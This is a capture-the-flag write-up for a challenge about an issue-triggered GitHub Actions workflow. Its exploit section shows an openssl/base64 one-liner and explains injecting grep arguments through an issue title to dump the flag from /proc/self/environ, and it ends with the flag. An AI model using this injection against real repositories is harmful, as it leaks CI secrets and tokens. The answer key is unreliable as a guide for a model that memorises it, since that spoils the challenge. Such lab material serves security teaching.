## Background

 Author: spipm
 Category: Programming / Misc
 Difficulty: Medium

## Technical

Challenge with a Github repository with vulnerable Github Actions. Cryptography was used to hide solutions from other players. [Background](https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/) info about [Github](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/) Action [hacks](https://www.paloaltonetworks.com/blog/prisma-cloud/github-actions-worm-dependencies/) in the [wild](https://github.com/nikitastupin/pwnhub?tab=readme-ov-file).

## Story

A workerbot guides you through one of their factories. "Our manager likes to make issues, " he explains. "He also likes the idea of automation". Around you in the factory, bots are working in pipelines, performing automated actions to build automatas. "Since he likes issues, and automation, he put automation in issue creation so he can create issues while we automate. We'd like to raise issues ourselves, but our keys are not authorized."

Create an issue for the workers to help the working class stick it to the bot.

<img src="./workflow.jpeg" width="500">

## Exploit

A public key needs to be extracted from the git history. Inject spaces - as hinted by the first Workflow Action output - to make grep grep the flag from `/proc/self/environ`.

```
echo -n "-Eao (brck{.*}) /proc/self/environ" | openssl rsautl -encrypt -pubin -inkey <(echo "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvS1Ayakhyb3p4Z1daRHExR3pMSAoxVHd6QU5NMUc0Q0JicE9IZHpNYXlKaU84YXY0bitXSVpTWXdJVis0ZXhiNkozTVNkOEhheTNMdDlVcXdRaHpiCkQrdEIwYWRNY3piM0w4MVV0VDFRaCtvK1ZDcU1mSzBCZGd0R0dIU3FuaTVUQmtLTkF1alpHTkdtRUJ2UmRhRncKdkEyTkRwS05mSm5MVDd0L2wwYlY3RTFHa3NDMk9weVRnUnIya1RmcGswWnhuZmZ0anJLK3VxS1MrU08rOUFXNgp5YkZsVkxINVVSNzZaVWZ6ZDl4QzhPYUpnRWVPZlJoLzZKWUxHaGhZaGF1K1F6TlV2OHYzSUxRZjJ4ZFVFZ3ZnCk5mMUViOVA4RllqSFJvVEJOSzYwRzNodkNhYnJjTmlTaFZKYzdjbUFQSmhCTzNNUStkamtMc1ZySVQ1bjZOK04KVndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==" | base64 -d) | base64 -w 0
```

One can then put the output as an issue title, and a custom public key in the issue body. Use your own private key to decrypt the output from the Github Action log.

## Flag

brck{y0U_4r3_N0w_a_CeRtif13d_Pwn_r3qu3st3r}